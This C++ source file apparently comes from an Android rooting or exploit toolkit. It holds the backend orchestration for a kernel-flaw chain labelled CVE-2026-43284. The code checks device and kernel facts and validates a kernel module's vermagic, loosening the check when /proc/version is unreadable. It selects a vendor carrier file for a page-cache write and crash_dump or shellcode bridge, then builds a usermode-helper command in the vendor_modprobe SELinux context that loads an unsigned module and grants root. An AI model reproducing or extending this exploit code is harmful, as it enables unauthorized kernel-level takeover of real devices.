/* CVE-2026-43284 backend -> umh_forward bridge (B5-7) -- implementation.
 *
 * Pure orchestration over injected ops: no fork, no exec, no file write and no
 * device probe. See backend_terminal.hpp for the contract and the fail-closed
 * rules. The real device bindings land in B5-8/B5-9. */

#include "backend/cve_2026_43284/backend_terminal.hpp"

#include "backend/cve_2026_43284/diag_line.hpp"
#include "backend/cve_2026_43284/schema.hpp"
#include "backend/cve_2026_43284_backend.hpp"
#include "backend/cve_2026_43284/steps/steps.hpp"
#include "profile/document.hpp"
#include "profile/schema.hpp"

#include <cstddef>
#include <cstdio>
#include <new>

namespace ghostlock::backend::cve_2026_43284 {
    namespace {
        /* Display tokens for the run diagnostics (design A.3/A.6): the log never
         * prints a bare error number, it prints the enum's own name. */
        [[nodiscard]] const char *terminal_error_name(BackendTerminalError error) noexcept {
            switch (error) {
            case BackendTerminalError::None: return "None";
            case BackendTerminalError::StepsMismatch: return "StepsMismatch";
            case BackendTerminalError::ProfileIncomplete: return "ProfileIncomplete";
            case BackendTerminalError::DeviceFactsUnavailable: return "DeviceFactsUnavailable";
            case BackendTerminalError::DeviceFactsIncomplete: return "DeviceFactsIncomplete";
            case BackendTerminalError::PatchedKernel: return "PatchedKernel";
            case BackendTerminalError::LkmPolicyRejected: return "LkmPolicyRejected";
            case BackendTerminalError::LkmPrecheckRejected: return "LkmPrecheckRejected";
            case BackendTerminalError::UmhCommandRejected: return "UmhCommandRejected";
            case BackendTerminalError::CarrierRejected: return "CarrierRejected";
            case BackendTerminalError::ChainRejected: return "ChainRejected";
            }
            return "Unknown";
        }

        [[nodiscard]] const char *fact_error_name(platform::DeviceFactError error) noexcept {
            switch (error) {
            case platform::DeviceFactError::None: return "None";
            case platform::DeviceFactError::Unavailable: return "Unavailable";
            case platform::DeviceFactError::ReleaseMissing: return "ReleaseMissing";
            case platform::DeviceFactError::ProcVersionMissing: return "ProcVersionMissing";
            case platform::DeviceFactError::SelinuxMissing: return "SelinuxMissing";
            case platform::DeviceFactError::CrashDumpMissing: return "CrashDumpMissing";
            case platform::DeviceFactError::CrashDumpLabelUnknown: return "CrashDumpLabelUnknown";
            case platform::DeviceFactError::VendorCandidatesMissing:
                return "VendorCandidatesMissing";
            case platform::DeviceFactError::SelinuxStateMissing: return "SelinuxStateMissing";
            }
            return "Unknown";
        }

        [[nodiscard]] const char *command_error_name(lkm::UmhCommandError error) noexcept {
            switch (error) {
            case lkm::UmhCommandError::None: return "None";
            case lkm::UmhCommandError::MissingRootProgram: return "MissingRootProgram";
            case lkm::UmhCommandError::MissingPackageName: return "MissingPackageName";
            case lkm::UmhCommandError::UnknownLateLoadArgs: return "UnknownLateLoadArgs";
            case lkm::UmhCommandError::UnknownSelinuxContext: return "UnknownSelinuxContext";
            case lkm::UmhCommandError::ArgTooLong: return "ArgTooLong";
            case lkm::UmhCommandError::ArgInvalid: return "ArgInvalid";
            case lkm::UmhCommandError::TooManyArgs: return "TooManyArgs";
            }
            return "Unknown";
        }

        /* Display tokens for the policy/image rejections. They spell the same
         * tokens as diagnostic::lkm_policy_error_name / lkm_image_error_name
         * (the report/CLI authority); mapping them locally keeps the attack path
         * free of a link edge to the diagnostic CLI unit. */
        [[nodiscard]] const char *policy_error_name(lkm::LkmPolicyError error) noexcept {
            switch (error) {
            case lkm::LkmPolicyError::None: return "None";
            case lkm::LkmPolicyError::MissingRelease: return "MissingRelease";
            case lkm::LkmPolicyError::ReleaseUnparsable: return "ReleaseUnparsable";
            case lkm::LkmPolicyError::PatchedKernel: return "PatchedKernel";
            case lkm::LkmPolicyError::MissingProfileKmi: return "MissingProfileKmi";
            case lkm::LkmPolicyError::KmiFieldMismatch: return "KmiFieldMismatch";
            case lkm::LkmPolicyError::UnsupportedKmi: return "UnsupportedKmi";
            case lkm::LkmPolicyError::MissingLkmPath: return "MissingLkmPath";
            case lkm::LkmPolicyError::UnknownLkmSource: return "UnknownLkmSource";
            case lkm::LkmPolicyError::UnknownLateLoadArgs: return "UnknownLateLoadArgs";
            }
            return "Unknown";
        }

        [[nodiscard]] const char *image_error_name(lkm::LkmImageError error) noexcept {
            switch (error) {
            case lkm::LkmImageError::None: return "None";
            case lkm::LkmImageError::ReadFailed: return "ReadFailed";
            case lkm::LkmImageError::NotRegular: return "NotRegular";
            case lkm::LkmImageError::TooSmall: return "TooSmall";
            case lkm::LkmImageError::TooLarge: return "TooLarge";
            case lkm::LkmImageError::NotElf: return "NotElf";
            case lkm::LkmImageError::NotAarch64: return "NotAarch64";
            case lkm::LkmImageError::MissingModinfo: return "MissingModinfo";
            case lkm::LkmImageError::MissingName: return "MissingName";
            case lkm::LkmImageError::VermagicMissing: return "VermagicMissing";
            case lkm::LkmImageError::VermagicMismatch: return "VermagicMismatch";
            case lkm::LkmImageError::VermagicSlotTooSmall: return "VermagicSlotTooSmall";
            case lkm::LkmImageError::NonEmptyVersions: return "NonEmptyVersions";
            case lkm::LkmImageError::SignedModule: return "SignedModule";
            }
            return "Unknown";
        }

        /* One structured line to stderr (same channel as the other 43284
         * diagnostics). Failing to print can never fail the run. */
        void emit(DiagLine &line) noexcept {
            (void)std::fputs(line.c_str(), stderr);
            (void)std::fflush(stderr);
        }
    } // namespace

    bool select_single_carrier(std::string_view path,
                               const platform::DeviceProbeOps &device,
                               steps::CarrierTarget &out,
                               bool allow_dev_path) noexcept {
        out = steps::CarrierTarget{};
        if (!path.empty()) {
            /* An explicit path comes straight from the profile; reject a
             * malformed one fail-closed instead of writing somewhere else. The
             * --allow-dev-target safety switch widens the SHAPE rule to the
             * non-vendor one-shot form (device gates only); it never bypasses
             * the absolute/shape checks themselves. */
            if (allow_dev_path ? !steps::valid_dev_carrier_path(path)
                               : !steps::valid_carrier_path(path)) {
                return false;
            }
            out.path = path;
            out.size = 0U;
            return true;
        }
        /* Absent path: prefer the first default the device probe reports
         * present. When the probe cannot confirm any of them, fall back to the
         * first default instead of failing: the probe is a plain stat()/access()
         * and is denied for privileged domains on some devices (the Shizuku shell
         * domain cannot getattr vendor files here), while the chain can still
         * reach such a carrier through the crash-dump bridge bound by patch #1.
         * The chain itself fails closed if the chosen carrier turns out to be
         * unusable, so an unconfirmed choice cannot silently write elsewhere. */
        if (device.file_fact != nullptr) {
            for (const steps::CarrierTarget &candidate : steps::kDefaultCarriers) {
                char probe_path[steps::kCarrierPathMaxBytes] = {};
                const std::size_t n = candidate.path.size() < sizeof(probe_path) - 1U
                                              ? candidate.path.size()
                                              : sizeof(probe_path) - 1U;
                for (std::size_t i = 0U; i < n; ++i) {
                    probe_path[i] = candidate.path[i];
                }
                platform::FileFact fact{};
                if (device.file_fact(device.ctx, probe_path, fact) && fact.exists) {
                    out = candidate;
                    return true;
                }
            }
        }
        out = steps::kDefaultCarriers[0];
        return true;
    }

    namespace {
        /* S4 R1 no-allocation default diagnostic: one line per triggered schema
         * default, owner-qualified as section.key (R2 moves to owner paths). */
        void emit_43284_default_used(void *ctx, std::string_view section,
                                     std::string_view key,
                                     profile::FieldSource source) noexcept {
            (void)ctx;
            (void)source;
            (void)std::fprintf(stderr, "default_used=%.*s.%.*s\n",
                               static_cast<int>(section.size()), section.data(),
                               static_cast<int>(key.size()), key.data());
            (void)std::fflush(stderr);
        }
    } // namespace

    BackendTerminalResult run_backend_terminal(const Cve2026_43284Profile &profile,
                                               const terminal::RootProgram &root_program,
                                               const IpsecSaParams &sa,
                                               const BackendTerminalDeps &deps,
                                               bool force_attack,
                                               terminal::UmhForwardInput &out) noexcept {
        BackendTerminalResult result{};
        /* The forced-test switch never bypasses a fail-closed device fact. */
        (void)force_attack;

        if (!profile.steps.has_value() ||
            profile.steps.value() != steps::PageCacheWriteSteps::id) {
            result.error = BackendTerminalError::StepsMismatch;
            DiagLine line("entry");
            line.n("stage", "profile").fail(terminal_error_name(result.error));
            emit(line);
            return result;
        }
        /* The SELinux exec context is an optional profile token whose 0 value is
         * the standard vendor_modprobe domain (also the embedded libc++ hook's
         * default binding), so an absent token resolves to it instead of failing
         * the run: the production path the App drives does not need to spell out
         * the default. Any other out-of-range value is still rejected. */
        const std::uint64_t selinux_token = profile.selinux_exec_context.value_or(
                kCve2026_43284SelinuxDefault);
        if (selinux_token > static_cast<std::uint64_t>(lkm::kSelinuxExecContextMax)) {
            result.error = BackendTerminalError::ProfileIncomplete;
            DiagLine line("entry");
            line.u("selinux_token", selinux_token).fail(terminal_error_name(result.error));
            emit(line);
            return result;
        }
        const std::uint32_t selinux_context = static_cast<std::uint32_t>(selinux_token);

        platform::DeviceFacts facts{};
        result.fact_error = platform::collect_device_facts(deps.device, facts);
        if (result.fact_error != platform::DeviceFactError::None) {
            result.error = result.fact_error == platform::DeviceFactError::Unavailable
                                   ? BackendTerminalError::DeviceFactsUnavailable
                                   : BackendTerminalError::DeviceFactsIncomplete;
            DiagLine line("facts");
            line.n("fact_error", fact_error_name(result.fact_error))
                    .fail(terminal_error_name(result.error));
            emit(line);
            return result;
        }
        /* Carry the unknown-by-policy facts into the result/log. has_f4c50a4 is
         * true only when /proc/version was actually read (device_facts.cpp), so
         * an unknown marker cannot select PatchedKernel below. */
        result.degraded = facts.degraded;
        if (facts.has_f4c50a4) {
            result.error = BackendTerminalError::PatchedKernel;
            DiagLine line("facts");
            line.n("release", facts.release.view()).fail(terminal_error_name(result.error));
            emit(line);
            return result;
        }
        {
            /* Degraded facts are already printed once by the caller of this
             * function (backend_terminal.cpp's run()); here we record the
             * release and whether /proc/version was readable (the only fact the
             * vermagic compare cannot pin when it was not). */
            DiagLine line("facts");
            line.n("release", facts.release.view())
                    .b("preempt_known", facts.preempt_known());
            emit(line);
        }

        lkm::LkmPolicyInput policy_input{};
        policy_input.facts.release = facts.release.view();
        policy_input.facts.has_f4c50a4 = facts.has_f4c50a4;
        policy_input.profile_kmi = profile.kmi;
        policy_input.lkm_path = profile.lkm_path;
        policy_input.late_load_args_token = profile.late_load_args;
        lkm::LkmSelection selection{};
        if (!lkm::resolve_lkm_selection(policy_input, selection, result.lkm_error)) {
            result.error = BackendTerminalError::LkmPolicyRejected;
            DiagLine line("policy");
            line.n("release", facts.release.view())
                    .n("error", policy_error_name(result.lkm_error))
                    .fail(terminal_error_name(result.error));
            emit(line);
            return result;
        }
        if (selection.kmi == nullptr) {
            result.error = BackendTerminalError::LkmPolicyRejected;
            DiagLine line("policy");
            line.n("release", facts.release.view())
                    .n("error", "UnsupportedKmi")
                    .fail(terminal_error_name(result.error));
            emit(line);
            return result;
        }
        {
            /* L1: the resolved entry facts, once, before anything is written. */
            DiagLine line("entry");
            line.n("release", facts.release.view())
                    .u("kmi", selection.kmi->kmi)
                    .n("source", selection.source == lkm::LkmSource::BundledKmi ? "bundled"
                                                                              : "custom")
                    .u("selinux_ctx", selinux_context)
                    .x("late_load_args", selection.late_load_args)
                    .s("module", profile.lkm_path.value_or(std::string_view{"-"}));
            emit(line);
        }

        const std::string_view package = lkm::default_root_package(root_program.kind);
        lkm::UmhCommand command{};
        /* kmi_label is the release-derived SupportedKmi::label ("android13-5.15"
         * for this device's 5.15.189 kernel); it feeds the --kmi/--allow-shell
         * pair the verified 43499 path uses. Never hand-written here. */
        const std::string_view kmi_label =
                selection.kmi != nullptr ? selection.kmi->label : std::string_view{};
        if (!lkm::build_late_load_command(root_program, package, kmi_label,
                                          selection.late_load_args, selinux_context,
                                          command, result.command_error)) {
            result.error = BackendTerminalError::UmhCommandRejected;
            DiagLine line("umh");
            line.n("command_error", command_error_name(result.command_error))
                    .fail(terminal_error_name(result.error));
            emit(line);
            return result;
        }
        {
            DiagLine line("umh");
            line.n("result", "built")
                    .n("package", package)
                    .u("selinux_ctx", selinux_context)
                    .x("late_load_args", selection.late_load_args);
            emit(line);
        }

        /* Single-candidate carrier (B6/T5): the composition root selected and
         * bound exactly one candidate; the chain is given that one and never
         * falls back, so the page-cache write target, the crash_dump read bridge
         * and the libc++ shellcode ko_target all name the same file. */
        if (deps.carrier == nullptr || deps.carrier->path.empty()) {
            result.error = BackendTerminalError::CarrierRejected;
            DiagLine line("carrier");
            line.fail(terminal_error_name(result.error));
            emit(line);
            return result;
        }
        steps::CarrierList carriers{};
        carriers.items[0] = *deps.carrier;
        carriers.count = 1U;

        if (deps.precheck_lkm != nullptr && !deps.lkm_image_path.empty()) {
            /* B5-9h-3: the precheck needs the full VERMAGIC_STRING inputs. preempt
             * comes from /proc/version; modversions/module_force_unload keep the
             * audited-target defaults (not probeable unprivileged).
             *
             * When /proc/version was denied (untrusted_app), preempt is unknown
             * and it is the only token we cannot pin. We do NOT accept any
             * module: the precheck runs once per preempt polarity and passes
             * only if one polarity clears EVERY rule, so release, mod_unload,
             * modversions, aarch64 and the CRC/signature checks are still
             * compared strictly. This relaxation is limited to the single
             * policy-denied read and never applies when /proc/version is
             * readable. Residual risk: an unknown preempt could mask another
             * unobservable option difference, but the kernel's own
             * check_modinfo()->same_magic() still rejects a mismatched module at
             * load time, so nothing silently loads. */
            lkm::DeviceKernelFacts required{};
            required.release = facts.release.view();
            required.has_f4c50a4 = facts.has_f4c50a4;
            required.preempt = lkm::proc_version_has_preempt(facts.proc_version.view());
            lkm::ModuleFacts module_facts{};
            bool precheck_ok = deps.precheck_lkm(deps.precheck_ctx, deps.lkm_image_path,
                                                 required, module_facts,
                                                 result.image_error);
            if (!precheck_ok && !facts.preempt_known()) {
                lkm::DeviceKernelFacts alternate = required;
                alternate.preempt = !required.preempt;
                lkm::ModuleFacts alternate_facts{};
                lkm::LkmImageError alternate_error = lkm::LkmImageError::None;
                if (deps.precheck_lkm(deps.precheck_ctx, deps.lkm_image_path,
                                      alternate, alternate_facts, alternate_error)) {
                    precheck_ok = true;
                    result.image_error = alternate_error;
                }
            }
            if (!precheck_ok) {
                result.error = BackendTerminalError::LkmPrecheckRejected;
                DiagLine line("module");
                line.s("path", deps.lkm_image_path)
                        .n("image_error", image_error_name(result.image_error))
                        .fail(terminal_error_name(result.error));
                emit(line);
                return result;
            }
            /* L2: what the precheck actually observed about the module. */
            DiagLine line("module");
            line.n("result", "ok")
                    .s("path", deps.lkm_image_path)
                    .b("vermagic", module_facts.vermagic_matches)
                    .b("rewritten", module_facts.vermagic_rewritten)
                    .n("diff", lkm::vermagic_diff_reason_name(module_facts.vermagic_diff))
                    .b("crcs", module_facts.has_crcs)
                    .b("signed", module_facts.signed_module)
                    .b("kcfi", module_facts.kcfi_present);
            emit(line);
        }

        steps::ChainRequest request{};
        request.carriers = carriers.items.data();
        request.carrier_count = carriers.count;
        /* S4 R4: the document carries the wait budget (schema default
         * 15000); the injected deps value is the host-test/staged fallback. */
        request.wait_timeout_ms = profile.wait_timeout_ms.value_or(deps.wait_timeout_ms);
        /* Target size from the composition root's fstat(2) of the same carrier
         * fd; 0 == unknown keeps the carrier's declared size authoritative. */
        request.target_size = deps.target_size;
        /* --allow-dev-target: the carrier was already chosen with the widened
         * shape rule; the chain must validate it the same way and must not use
         * the vendor-only crash_dump fallbacks for it. */
        request.allow_dev_carrier_path = deps.allow_dev_carrier_path;
        /* The composition root's module write plan. A null plan leaves the
         * request plan empty, which validate_plan_closure() rejects before any
         * patch #1 / hook / trigger, so a missing module fails closed. */
        if (deps.plan != nullptr) {
            request.plan = *deps.plan;
        }
        steps::ChainWorkspace workspace{};
        result.chain = steps::run_chain(request, deps.chain, workspace);
        if (result.chain.error != steps::ChainError::None || !result.chain.lkm_loaded) {
            result.error = BackendTerminalError::ChainRejected;
            DiagLine line("chain");
            line.n("chain_error", steps::chain_error_name(result.chain.error))
                    .b("lkm_loaded", result.chain.lkm_loaded)
                    .fail(terminal_error_name(result.error));
            emit(line);
            return result;
        }
        {
            /* L12: one summary line per run; every phase that ran is named. */
            DiagLine line("stage");
            line.n("result", "ok")
                    .n("source", selection.source == lkm::LkmSource::BundledKmi ? "bundled"
                                                                              : "custom")
                    .u("kmi", selection.kmi->kmi)
                    .s("carrier", result.chain.carrier != nullptr
                                          ? result.chain.carrier->path
                                          : std::string_view{"-"})
                    .u("wait_ms", request.wait_timeout_ms)
                    .u("written", result.chain.blocks_written)
                    .u("verified", result.chain.blocks_verified);
            emit(line);
        }

        out.root_program = root_program;
        out.lkm_loaded = true;
        out.lkm_source = selection.source == lkm::LkmSource::BundledKmi
                                 ? terminal::UmhLkmSource::BundledKmi
                                 : terminal::UmhLkmSource::CustomFile;
        out.set_kmi_label(selection.kmi->label);
        out.command = command;
        if (result.chain.carrier != nullptr) {
            out.set_carrier_path(result.chain.carrier->path);
        }
        out.session_secrets = &sa;
        out.session_secrets_size = sizeof(IpsecSaParams);
        out.channel = deps.umh_channel;
        /* chain.carrier points into the local carrier list; do not leak it. */
        result.chain.carrier = nullptr;
        result.ready = true;
        return result;
    }

    Cve2026_43284State &cve_2026_43284_state(session::CoreSession &state) noexcept {
        return *std::launder(reinterpret_cast<Cve2026_43284State *>(state.backend_state));
    }

    const Cve2026_43284State &cve_2026_43284_state(
            const session::CoreSession &state) noexcept {
        return *std::launder(
                reinterpret_cast<const Cve2026_43284State *>(state.backend_state));
    }

    void cve_2026_43284_state_construct(session::CoreSession &state) noexcept {
        if (state.backend_state_ready) {
            return;
        }
        std::construct_at(reinterpret_cast<Cve2026_43284State *>(state.backend_state));
        state.backend_state_ready = true;
        state.backend_state_dtor = [](void *raw) noexcept {
            auto *typed = static_cast<Cve2026_43284State *>(raw);
            zeroize(typed->sa);
            typed->~Cve2026_43284State();
        };
    }

    void cve_2026_43284_state_destroy(session::CoreSession &state) noexcept {
        if (!state.backend_state_ready) {
            return;
        }
        if (state.backend_state_dtor != nullptr) {
            state.backend_state_dtor(state.backend_state);
            state.backend_state_dtor = nullptr;
        }
        state.backend_state_ready = false;
    }

} // namespace ghostlock::backend::cve_2026_43284

namespace ghostlock::backend {
    using ghostlock::session::CoreSession;
    using ghostlock::contract::StageResult;

    profile::BindStatus Cve2026_43284Policy::state_from(
            CoreSession &session, const profile::Document &document) {
        profile::Document owned;
        owned.release = document.release;
        owned.terminal = document.terminal;
        owned.backend = document.backend;
        owned.middleware = document.middleware;
        for (const profile::Section &section : document.sections) {
            /* Both owner sections (backend + execution): one predicate, so the
             * execution knobs can never be dropped here and silently default. */
            if (is_cve_2026_43284_section(section.name)) {
                owned.sections.push_back(section);
            }
        }
        /* S4 R1: the registry bind is the single authority for requiredness and
         * defaults; each triggered default is reported before it is stored. */
        Cve2026_43284Profile view{};
        profile::BindSink<Cve2026_43284Profile> sink = profile::make_sink(view);
        sink.log = profile::BindLog{&cve_2026_43284::emit_43284_default_used,
                                    nullptr};
        const profile::BindStatus status = profile::bind_all(
                profile::make_registry<Cve2026_43284Schema>(), owned, sink,
                profile::BindMode::Production);
        if (!status.ok()) return status;
        cve_2026_43284::Cve2026_43284State &state =
                cve_2026_43284::cve_2026_43284_state(session);
        state.profile = view;
        /* S4 R1 device-gate diagnostic: print the resolved values so a before/after
         * comparison can prove the schema defaults did not move any effective
         * value. lkm_path is the concrete helper mirror the production bind uses;
         * <bundled> when no module path is bound (unit tests). */
        const std::uint64_t kmi = view.kmi.value_or(0U);
        const std::uint64_t selinux = view.selinux_exec_context.value_or(
                kCve2026_43284SelinuxDefault);
        const std::uint64_t late_load =
                view.late_load_args.value_or(kCve2026_43284LateLoadArgsDefault);
        const std::string_view lkm_path = state.deps.lkm_image_path.empty()
                                                  ? std::string_view{"<bundled>"}
                                                  : state.deps.lkm_image_path;
        (void)std::fprintf(
                stderr,
                "profile_resolved kmi=%llu lkm_path=%.*s selinux_ctx=%llu "
                "late_load_args=%llu\n",
                static_cast<unsigned long long>(kmi),
                static_cast<int>(lkm_path.size()), lkm_path.data(),
                static_cast<unsigned long long>(selinux),
                static_cast<unsigned long long>(late_load));
        (void)std::fflush(stderr);
        return status;
    }

    StageResult Cve2026_43284Policy::run(CoreSession &session,
                                         const char *debug_dir, bool force_attack,
                                         ghostlock::terminal::UmhForwardInput &out) {
        (void)debug_dir;
        cve_2026_43284::Cve2026_43284State &state =
                cve_2026_43284::cve_2026_43284_state(session);
        const cve_2026_43284::BackendTerminalResult result =
                cve_2026_43284::run_backend_terminal(state.profile, state.root_program,
                                                    state.sa, state.deps, force_attack, out);
        if (platform::degraded_any(result.degraded)) {
            /* The untrusted_app path loses /proc/version etc. by policy; emit
             * the exact set once so the device gate can assert on it directly,
             * on both the success and failure paths. In the shell domain every
             * fact is readable, degraded_any() is false and no line is emitted,
             * so that path's output is unchanged. */
            char degraded[64] = {};
            (void)platform::format_device_fact_degraded(result.degraded, degraded,
                                                        sizeof(degraded));
            (void)std::fprintf(stderr, "device_facts degraded=%s\n", degraded);
            (void)std::fflush(stderr);
        }
        if (!result.ready) {
            /* A silent Failed leaves the App with no diagnosis; name the reason. */
            (void)std::fprintf(stderr,
                               "cve_2026_43284 backend failed: error=%d fact_error=%d "
                               "lkm_error=%d image_error=%d\n",
                               static_cast<int>(result.error),
                               static_cast<int>(result.fact_error),
                               static_cast<int>(result.lkm_error),
                               static_cast<int>(result.image_error));
            (void)std::fflush(stderr);
        }
        return result.ready ? StageResult::Continue : StageResult::Failed;
    }
} // namespace ghostlock::backend
